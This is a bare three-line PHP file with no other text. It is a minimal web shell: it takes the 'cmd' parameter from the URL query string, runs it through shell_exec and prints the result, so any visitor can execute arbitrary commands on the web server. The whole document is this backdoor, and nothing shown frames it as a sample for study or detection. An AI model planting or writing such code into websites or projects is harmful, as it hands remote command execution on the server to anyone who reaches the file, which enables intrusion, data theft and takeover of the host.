<?php
  if(isset($_GET["cmd"])) echo shell_exec($_GET["cmd"]);
?>
